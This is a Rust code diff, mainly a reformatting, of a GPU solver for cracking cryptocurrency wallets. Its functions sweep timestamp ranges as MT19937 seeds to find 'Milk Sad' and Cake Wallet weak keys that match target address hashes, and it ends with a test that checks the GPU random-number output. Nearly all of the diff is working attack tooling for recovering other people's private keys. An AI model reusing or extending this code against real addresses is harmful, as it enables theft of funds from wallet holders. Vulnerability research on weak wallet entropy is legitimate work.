-            let addr_idx = raw[i * 3 + 2] as u32;
-            out.push((ts_ms, change, addr_idx));
+            out.push((raw[i*3], raw[i*3+1] as u32, raw[i*3+2] as u32));
         }
         Ok(out)
     }
 
-    /// Compute Cake Wallet Full Batch
     pub fn compute_cake_batch_full(&self, seed_indices: &[u32]) -> ocl::Result<Vec<[u8; 33]>> {
         let kernel_name = "batch_cake_full";
         let batch_size = seed_indices.len();
-        if batch_size == 0 {
-            return Ok(Vec::new());
-        }
+        if batch_size == 0 { return Ok(Vec::new()); }
 
         let buffer_seeds = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
@@ -1181,15 +1059,11 @@ impl GpuSolver {
         let kernel = self
             .pro_que
             .kernel_builder(kernel_name)
-            .arg(&buffer_seeds)
-            .arg(&buffer_results)
+            .arg(&buffer_seeds).arg(&buffer_results)
             .arg(batch_size as u32)
             .global_work_size(batch_size)
             .build()?;
-
-        unsafe {
-            kernel.enq()?;
-        }
+        unsafe { kernel.enq()?; }
 
         let mut results_bytes = vec![0u8; total_output_bytes];
         buffer_results.read(&mut results_bytes).enq()?;
@@ -1200,7 +1074,6 @@ impl GpuSolver {
             k.copy_from_slice(chunk);
             keys.push(k);
         }
-
         Ok(keys)
     }
 
@@ -1217,66 +1090,44 @@ impl GpuSolver {
             256 => "milk_sad_crack_256",
             _   => "milk_sad_crack",
         };
-
         let max_results = 1024;
+
         let buffer_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
             .len(max_results)
             .build()?;
-
         let buffer_count = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
             .len(1)
             .build()?;
-
         buffer_count.write(&vec![0u32]).enq()?;
 
-        let mut h1: u64 = 0;
-        let mut h2: u64 = 0;
-        let mut h3: u32 = 0;
-
-        for (i, &byte) in target_h160.iter().enumerate().take(8) {
-            h1 |= (byte as u64) << (i * 8);
-        }
-        for (i, &byte) in target_h160.iter().skip(8).enumerate().take(8) {
-            h2 |= (byte as u64) << (i * 8);
-        }
-        for (i, &byte) in target_h160.iter().skip(16).enumerate().take(4) {
-            h3 |= (byte as u32) << (i * 8);
-        }
+        let mut h1: u64 = 0; let mut h2: u64 = 0; let mut h3: u32 = 0;
+        for (i, &b) in target_h160.iter().enumerate().take(8)       { h1 |= (b as u64) << (i * 8); }
+        for (i, &b) in target_h160.iter().skip(8).enumerate().take(8)  { h2 |= (b as u64) << (i * 8); }
+        for (i, &b) in target_h160.iter().skip(16).enumerate().take(4) { h3 |= (b as u32) << (i * 8); }
 
         let kernel = self
             .pro_que
             .kernel_builder(kernel_name)
-            .arg(&buffer_results)
-            .arg(&buffer_count)
-            .arg(h1)
-            .arg(h2)
-            .arg(h3)
+            .arg(&buffer_results).arg(&buffer_count)
+            .arg(h1).arg(h2).arg(h3)
             .arg(purpose)
             .arg(start_timestamp)
             .build()?;
 
         let range = (end_timestamp - start_timestamp) as usize;
-        let local_work_size  = self.max_work_group_size.min(256);
-        let global_work_size = range.div_ceil(local_work_size) * local_work_size;
-
-        unsafe {
-            kernel
-                .cmd()
-                .global_work_size(global_work_size)
-                .local_work_size(local_work_size)
-                .enq()?;
-        }
+        let local  = self.max_work_group_size.min(256);
+        let global = range.div_ceil(local) * local;
+        unsafe { kernel.cmd().global_work_size(global).local_work_size(local).enq()?; }
 
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let count = count_vec[0] as usize;
-
         if count > 0 {
-            let read_count = std::cmp::min(count, max_results);
+            let read_count = count.min(max_results);
             let mut results = vec![0u64; max_results];
             buffer_results.read(&mut results).enq()?;
             Ok(results[0..read_count].to_vec())
@@ -1285,7 +1136,6 @@ impl GpuSolver {
         }
     }
 
-    /// Multi-target MilkSad crack
     pub fn compute_milk_sad_crack_multi_target(
         &self,
         start_timestamp: u32,
@@ -1296,7 +1146,7 @@ impl GpuSolver {
         multipath: bool,
     ) -> ocl::Result<Vec<(u32, u32, u32)>> {
         let target_count = purposes.len() as u32;
-        assert_eq!(flat_h160.len(), purposes.len() * 20, "flat_h160 must be N×20 bytes");
+        assert_eq!(flat_h160.len(), purposes.len() * 20);
 
         let kernel_name = match (entropy_bits, multipath) {
             (256, true)  => "milk_sad_mt_multi30_256",
@@ -1306,7 +1156,6 @@ impl GpuSolver {
             (_,   true)  => "milk_sad_mt_multi30",
             (_,   false) => "milk_sad_mt",
         };
-
         let max_results = 8192usize;
 
         let buf_h160 = Buffer::<u8>::builder()
@@ -1315,20 +1164,17 @@ impl GpuSolver {
             .len(flat_h160.len())
             .copy_host_slice(flat_h160)
             .build()?;
-
         let buf_purposes = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
             .len(purposes.len())
             .copy_host_slice(purposes)
             .build()?;
-
         let buf_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
             .len(max_results * 2)
             .build()?;
-
         let buf_count = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
@@ -1343,41 +1189,30 @@ impl GpuSolver {
         let kernel = self
             .pro_que
             .kernel_builder(kernel_name)
-            .arg(&buf_results)
-            .arg(&buf_count)
-            .arg(&buf_h160)
-            .arg(&buf_purposes)
+            .arg(&buf_results).arg(&buf_count)
+            .arg(&buf_h160).arg(&buf_purposes)
             .arg(target_count)
             .arg(start_timestamp)
             .arg(max_results as u32)
-            .global_work_size(global)
-            .local_work_size(local)
+            .global_work_size(global).local_work_size(local)
             .build()?;
-
         unsafe { kernel.cmd().global_work_size(global).local_work_size(local).enq()?; }
 
         let mut count_vec = vec![0u32; 1];
         buf_count.read(&mut count_vec).enq()?;
         let count = (count_vec[0] as usize).min(max_results);
-
         if count == 0 { return Ok(Vec::new()); }
 
         let mut raw = vec![0u64; max_results * 2];
         buf_results.read(&mut raw).enq()?;
 
-        let output = (0..count).map(|i| {
+        Ok((0..count).map(|i| {
             let w0 = raw[i * 2];
             let w1 = raw[i * 2 + 1];
-            let timestamp  = (w0 & 0xFFFF_FFFF) as u32;
-            let addr_idx   = (w0 >> 32) as u32;
-            let target_idx = w1 as u32;
-            (timestamp, addr_idx, target_idx)
-        }).collect();
-
-        Ok(output)
+            ((w0 & 0xFFFF_FFFF) as u32, (w0 >> 32) as u32, w1 as u32)
+        }).collect())
     }
 
-    /// Multi-path MilkSad crack - checks 30 receive addresses per timestamp
     pub fn compute_milk_sad_crack_multipath(
         &self,
         start_timestamp: u32,
@@ -1391,76 +1226,47 @@ impl GpuSolver {
             256 => "milk_sad_crack_multi30_256",
             _   => "milk_sad_crack_multi30",
         };
-
         let max_results = 1024;
+
         let buffer_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
             .len(max_results)
             .build()?;
-
         let buffer_count = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
             .len(1)
             .build()?;
-
         buffer_count.write(&vec![0u32]).enq()?;
 
-        let mut h1: u64 = 0;
-        let mut h2: u64 = 0;
-        let mut h3: u32 = 0;
-
-        for (i, &byte) in target_h160.iter().enumerate().take(8) {
-            h1 |= (byte as u64) << (i * 8);
-        }
-        for (i, &byte) in target_h160.iter().skip(8).enumerate().take(8) {
-            h2 |= (byte as u64) << (i * 8);
-        }
-        for (i, &byte) in target_h160.iter().skip(16).enumerate().take(4) {
-            h3 |= (byte as u32) << (i * 8);
-        }
+        let mut h1: u64 = 0; let mut h2: u64 = 0; let mut h3: u32 = 0;
+        for (i, &b) in target_h160.iter().enumerate().take(8)       { h1 |= (b as u64) << (i * 8); }
+        for (i, &b) in target_h160.iter().skip(8).enumerate().take(8)  { h2 |= (b as u64) << (i * 8); }
+        for (i, &b) in target_h160.iter().skip(16).enumerate().take(4) { h3 |= (b as u32) << (i * 8); }
 
         let kernel = self
             .pro_que
             .kernel_builder(kernel_name)
-            .arg(&buffer_results)
-            .arg(&buffer_count)
-            .arg(h1)
-            .arg(h2)
-            .arg(h3)
+            .arg(&buffer_results).arg(&buffer_count)
+            .arg(h1).arg(h2).arg(h3)
             .arg(purpose)
             .arg(start_timestamp)
             .build()?;
 
         let range = (end_timestamp - start_timestamp) as usize;
-        let local_work_size  = self.max_work_group_size.min(256);
-        let global_work_size = range.div_ceil(local_work_size) * local_work_size;
-
-        unsafe {
-            kernel
-                .cmd()
-                .global_work_size(global_work_size)
-                .local_work_size(local_work_size)
-                .enq()?;
-        }
+        let local  = self.max_work_group_size.min(256);
+        let global = range.div_ceil(local) * local;
+        unsafe { kernel.cmd().global_work_size(global).local_work_size(local).enq()?; }
 
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let count = count_vec[0] as usize;
-
         if count > 0 {
-            let read_count = std::cmp::min(count, max_results);
+            let read_count = count.min(max_results);
             let mut results = vec![0u64; max_results];
             buffer_results.read(&mut results).enq()?;
-
-            let mut output = Vec::new();
-            for &val in results.iter().take(read_count) {
-                let timestamp = (val & 0xFFFFFFFF) as u32;
-                let addr_idx  = (val >> 32) as u32;
-                output.push((timestamp, addr_idx));
-            }
-            Ok(output)
+            Ok(results.iter().take(read_count).map(|&v| ((v & 0xFFFFFFFF) as u32, (v >> 32) as u32)).collect())
         } else {
             Ok(Vec::new())
         }
@@ -1468,46 +1274,35 @@ impl GpuSolver {
 
     pub fn test_mt19937(&self, seeds: &[u32]) -> ocl::Result<Vec<[u8; 16]>> {
         let count = seeds.len();
-
         let buffer_seeds = Buffer::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
             .len(count)
             .copy_host_slice(seeds)
             .build()?;
-
         let buffer_results = Buffer::<u8>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().write_only().alloc_host_ptr())
             .len(count * 16)
             .build()?;
-
         let local_work_size = self.calculate_local_work_size(count);
-
         let kernel = self
             .pro_que
             .kernel_builder("test_mt19937")
-            .arg(&buffer_seeds)
-            .arg(&buffer_results)
+            .arg(&buffer_seeds).arg(&buffer_results)
             .arg(count as u32)
-            .global_work_size(count)
-            .local_work_size(local_work_size)
+            .global_work_size(count).local_work_size(local_work_size)
             .build()?;
-
-        unsafe {
-            kernel.enq()?;
-        }
+        unsafe { kernel.enq()?; }
 
         let mut raw_results = vec![0u8; count * 16];
         buffer_results.read(&mut raw_results).enq()?;
-
         let mut results = Vec::with_capacity(count);
         for chunk in raw_results.chunks(16) {
             let mut entropy = [0u8; 16];
             entropy.copy_from_slice(chunk);
             results.push(entropy);
         }
-
         Ok(results)
     }
 
@@ -1520,41 +1315,26 @@ impl GpuSolver {
             ocl::enums::DeviceInfoResult::DriverVersion(v) => v,
             _ => "Unknown".to_string(),
         };
-
         let compute_units = match device.info(ocl::enums::DeviceInfo::MaxComputeUnits)? {
-            ocl::enums::DeviceInfoResult::MaxComputeUnits(u) => u,
-            _ => 0,
+            ocl::enums::DeviceInfoResult::MaxComputeUnits(u) => u, _ => 0,
         };
         let clock_freq = match device.info(ocl::enums::DeviceInfo::MaxClockFrequency)? {
-            ocl::enums::DeviceInfoResult::MaxClockFrequency(f) => f,
-            _ => 0,
+            ocl::enums::DeviceInfoResult::MaxClockFrequency(f) => f, _ => 0,
         };
         let global_mem = match device.info(ocl::enums::DeviceInfo::GlobalMemSize)? {
-            ocl::enums::DeviceInfoResult::GlobalMemSize(s) => s / (1024 * 1024),
-            _ => 0,
+            ocl::enums::DeviceInfoResult::GlobalMemSize(s) => s / (1024 * 1024), _ => 0,
         };
         let local_mem = match device.info(ocl::enums::DeviceInfo::LocalMemSize)? {
-            ocl::enums::DeviceInfoResult::LocalMemSize(s) => s / 1024,
-            _ => 0,
+            ocl::enums::DeviceInfoResult::LocalMemSize(s) => s / 1024, _ => 0,
         };
         let max_alloc = match device.info(ocl::enums::DeviceInfo::MaxMemAllocSize)? {
-            ocl::enums::DeviceInfoResult::MaxMemAllocSize(s) => s / (1024 * 1024),
-            _ => 0,
+            ocl::enums::DeviceInfoResult::MaxMemAllocSize(s) => s / (1024 * 1024), _ => 0,
         };
-
         Ok(format!(
-            "GPU Device Information:\n\
-             Name: {}\n\
-             Vendor: {}\n\
-             Version: {}\n\
-             Driver: {}\n\
-             Compute Units: {}\n\
-             Clock Frequency: {} MHz\n\
-             Global Memory: {} MB\n\
-             Local Memory: {} KB\n\
-             Max Allocation: {} MB\n\
-             Max Work Group Size: {}\n\
-             Preferred Multiple: {}",
+            "GPU Device Information:\nName: {}\nVendor: {}\nVersion: {}\nDriver: {}\n\
+             Compute Units: {}\nClock Frequency: {} MHz\nGlobal Memory: {} MB\n\
+             Local Memory: {} KB\nMax Allocation: {} MB\n\
+             Max Work Group Size: {}\nPreferred Multiple: {}",
             name, vendor, version, driver,
             compute_units, clock_freq, global_mem, local_mem, max_alloc,
             self.max_work_group_size, self.preferred_work_group_multiple
@@ -1569,50 +1349,24 @@ mod tests {
     #[test]
     fn test_mt19937_validation() {
         let test_cases = vec![
-            (
-                0u32,
-                &[
-                    0x8cu8, 0x7fu8, 0x0au8, 0xacu8, 0x97u8, 0xc4u8, 0xaau8, 0x2fu8,
-                    0xb7u8, 0x16u8, 0xa6u8, 0x75u8, 0xd8u8, 0x21u8, 0xccu8, 0xc0u8,
-                ] as &[u8],
-            ),
-            (
-                1u32,
-                &[
-                    0x6au8, 0xc1u8, 0xf4u8, 0x25u8, 0xffu8, 0x47u8, 0x80u8, 0xebu8,
-                    0xb8u8, 0x67u8, 0x2fu8, 0x8cu8, 0xeeu8, 0xbcu8, 0x14u8, 0x48u8,
-                ] as &[u8],
-            ),
-            (
-                1234567890u32,
-                &[
-                    0x9eu8, 0x69u8, 0x55u8, 0x82u8, 0x57u8, 0x2bu8, 0x97u8, 0xffu8,
-                    0x97u8, 0x74u8, 0xa5u8, 0x66u8, 0x26u8, 0x26u8, 0xe4u8, 0x2fu8,
-                ] as &[u8],
-            ),
+            (0u32,          &[0x8cu8,0x7f,0x0a,0xac,0x97,0xc4,0xaa,0x2f,0xb7,0x16,0xa6,0x75,0xd8,0x21,0xcc,0xc0] as &[u8]),
+            (1u32,          &[0x6au8,0xc1,0xf4,0x25,0xff,0x47,0x80,0xeb,0xb8,0x67,0x2f,0x8c,0xee,0xbc,0x14,0x48] as &[u8]),
+            (1234567890u32, &[0x9eu8,0x69,0x55,0x82,0x57,0x2b,0x97,0xff,0x97,0x74,0xa5,0x66,0x26,0x26,0xe4,0x2f] as &[u8]),
         ];
-
         let solver = match GpuSolver::new() {
             Ok(s)  => s,
-            Err(e) => { eprintln!("GPU not available for test: {}", e); return; }
+            Err(e) => { eprintln!("GPU not available: {}", e); return; }
         };
-
         let seeds: Vec<u32> = test_cases.iter().map(|(s, _)| *s).collect();
-
         match solver.test_mt19937(&seeds) {
             Ok(results) => {
                 for (i, (seed, expected)) in test_cases.iter().enumerate() {
-                    eprintln!("Testing seed: {}", seed);
-                    eprintln!("  Expected: {:02x?}", expected);
-                    eprintln!("  Got:      {:02x?}", &results[i]);
+                    eprintln!("Seed {}: expected {:02x?}, got {:02x?}", seed, expected, &results[i]);
                     assert_eq!(&results[i][..], *expected, "MT19937 mismatch for seed {}", seed);
                 }
                 eprintln!("All MT19937 tests passed!");
             }
-            Err(e) => {
-                eprintln!("GPU test failed: {}", e);
-                panic!("MT19937 GPU test failed");
-            }
+            Err(e) => panic!("MT19937 GPU test failed: {}", e),
         }
     }
 }
